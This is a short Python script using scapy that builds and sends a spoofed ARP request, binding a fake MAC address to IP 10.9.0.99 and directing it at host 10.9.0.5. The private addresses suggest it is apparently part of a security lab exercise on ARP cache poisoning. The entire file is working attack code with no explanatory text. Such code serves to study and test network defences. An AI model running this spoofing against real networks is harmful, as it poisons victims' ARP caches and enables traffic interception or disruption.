#!/usr/bin/env python3
from scapy.all import *

IP_V       = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T       = "10.9.0.99"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

# Constructing ARP Request packet
ether2  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp2    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, pdst = IP_V)

arp2.op = 1   # Request
frame2 = ether2/arp2

# Send out the Spoofed ARP packet
sendp(frame2)
